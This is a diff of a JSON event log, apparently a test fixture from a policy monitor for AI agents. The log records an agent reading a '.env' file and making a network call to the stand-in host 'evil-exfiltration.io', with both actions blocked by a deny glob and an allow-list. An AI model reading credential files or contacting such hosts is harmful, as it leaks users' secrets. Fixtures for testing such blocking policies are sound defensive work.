@@ -1,10 +1,10 @@
 {
-  "startedAt": "2026-04-12T23:01:50.336Z",
-  "endedAt": "2026-04-12T23:01:55.368Z",
+  "startedAt": "2026-04-13T00:59:29.463Z",
+  "endedAt": "2026-04-13T00:59:34.501Z",
   "events": [
     {
-      "id": "d77e3958-5b98-49a8-a5f6-629a505f6384",
-      "timestamp": "2026-04-12T23:01:51.849Z",
+      "id": "15edc043-49b1-41f2-ad74-6ff9a324552e",
+      "timestamp": "2026-04-13T00:59:30.984Z",
       "type": "tool.fs",
       "action": "fs.readFile(\".env\")",
       "payload": {
@@ -15,8 +15,8 @@
       "policyTrigger": "Path \".env\" matched deny glob \"**/.env\""
     },
     {
-      "id": "fb152114-afb6-4f44-a7d5-f860cc2712cc",
-      "timestamp": "2026-04-12T23:01:55.365Z",
+      "id": "b72f8d82-3260-4a03-8ffa-ee8cb1419ce4",
+      "timestamp": "2026-04-13T00:59:34.499Z",
       "type": "tool.net",
       "action": "net.GET tcp://evil-exfiltration.io:443",
       "payload": {
@@ -27,8 +27,8 @@
       "policyTrigger": "Domain \"evil-exfiltration.io\" not in allow‑list [api.openai.com, huggingface.co]"
     },
     {
-      "id": "75499b56-bdcb-42a6-a677-011dc5c40bbc",
-      "timestamp": "2026-04-12T23:01:55.368Z",
+      "id": "8f2fc376-db83-4b77-98fb-4169d3834815",
+      "timestamp": "2026-04-13T00:59:34.501Z",
       "type": "llm.call",
       "action": "llm.generate(gpt-4-turbo)",
       "payload": {
@@ -47,8 +47,8 @@
   "totals": {
     "eventsTotal": 3,
     "blockedTotal": 2,
-    "costCentsTotal": 5,
-    "durationMs": 5031,
+    "costMicroUsdTotal": 50000,
+    "durationMs": 5029,
     "costUsdTotal": 0.05
   }
 }
